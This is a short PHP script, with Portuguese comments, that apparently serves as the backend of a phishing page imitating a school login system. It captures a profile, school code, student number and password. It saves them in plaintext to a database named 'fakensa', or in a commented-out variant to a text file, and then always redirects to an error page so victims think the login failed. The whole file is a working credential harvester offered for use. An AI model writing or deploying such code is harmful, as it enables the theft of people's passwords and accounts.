<?php

/* Mandar para bloco de notas
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $perfil = $_POST['perfil'] ?? '';
    $codetec = $_POST['codetec'] ?? '';
    $rm = $_POST['rm'] ?? '';
    $senha = $_POST['senha'] ?? '';

    // Tenta salvar em um arquivo
    $linha = "$perfil;$codetec;$rm;$senha\n";
    $salvo = file_put_contents("dados.txt", $linha, FILE_APPEND);

    if ($salvo !== false) {
        // Redireciona para erro.html (ou poderia ser uma "página de sucesso" se desejar)
        header("Location: erro.html");
        exit;
    } else {
        // Se não conseguiu salvar, também redireciona
        header("Location: erro.html");
        exit;
    }
}

*/




/* Mandar para banco de dados XAMPP*/
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $perfil = $_POST['perfil'] ?? '';
    $codetec = $_POST['codetec'] ?? '';
    $rm = $_POST['rm'] ?? '';
    $senha = $_POST['senha'] ?? '';

    // Dados de conexão (ajuste conforme seu ambiente)
    $servername = "localhost";
    $username = "root";
    $password = ""; // padrão do XAMPP é senha vazia
    $dbname = "fakensa";

    // Cria conexão
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Verifica conexão
    if ($conn->connect_error) {
        // Se falhar na conexão, redireciona para erro.html
        header("Location: erro.html");
        exit;
    }

    // Prepara e executa o INSERT
    $sql = "INSERT INTO usuarios (perfil, codetec, rm, senha) VALUES (?, ?, ?, ?)";
    $stmt = $conn->prepare($sql);

    if ($stmt) {
        $stmt->bind_param("ssss", $perfil, $codetec, $rm, $senha);
        $stmt->execute();
        $stmt->close();
    }

    $conn->close();

    // Redireciona para erro.html sempre após o envio
    header("Location: erro.html");
    exit;
}






/* CÓDIGO SQL BANCO DE DADOS


CREATE DATABASE fakensa;
USE fakensa;
CREATE TABLE usuarios (
    id INT AUTO_INCREMENT PRIMARY KEY,
    perfil VARCHAR(50),
    codetec VARCHAR(50),
    rm VARCHAR(50),
    senha VARCHAR(255)
);



*/



?>
